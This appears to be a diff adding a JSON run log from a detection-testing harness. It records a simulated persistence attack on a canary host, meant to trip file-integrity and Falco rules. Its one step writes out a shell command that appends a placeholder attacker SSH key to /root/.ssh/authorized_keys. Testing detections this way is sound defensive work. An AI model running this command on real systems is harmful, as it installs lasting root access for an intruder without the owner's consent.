@@ -1,0 +1,36 @@
+{
+  "run_id": "persistence-authorized-keys-31-4c3c161d",
+  "scenario_id": "persistence-authorized-keys",
+  "category": "execution",
+  "description": "Foothold on canary-1 appends an attacker SSH public key to /root/.ssh/authorized_keys \u2014 classic persistence via credential installation. Produces file-integrity (rule-550) + syscall (Falco write-below-etc / write-sensitive-file) signals.",
+  "seed": 31,
+  "overrides": {
+    "target": "db-1"
+  },
+  "resolved": {
+    "intensity": 1,
+    "source_user": "root",
+    "target_host": "db-1"
+  },
+  "pre_run": {
+    "cr_mode": "none"
+  },
+  "started_at": "2026-07-26T09:00:51+00:00",
+  "finished_at": "2026-07-26T09:00:53+00:00",
+  "aborted": false,
+  "steps": [
+    {
+      "step_index": 0,
+      "iteration": 0,
+      "source_host": "canary-1",
+      "source_user": "root",
+      "cmd": "mkdir -p /root/.ssh && chmod 700 /root/.ssh\nts=$(date +%s)\necho \"ssh-rsa AAAAB3NzaC1yc2EAAAAD_fake_key_0_${ts}_attacker attacker@elsewhere\" \\\n  >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\nls -la /root/.ssh/authorized_keys\n",
+      "rc": 0,
+      "stdout_tail": "-rw------- 1 root root 158 Jul 26 09:00 /root/.ssh/authorized_keys\n",
+      "stderr_tail": "",
+      "started_at": "2026-07-26T09:00:51+00:00",
+      "ended_at": "2026-07-26T09:00:53+00:00",
+      "duration_s": 2.529
+    }
+  ]
+}
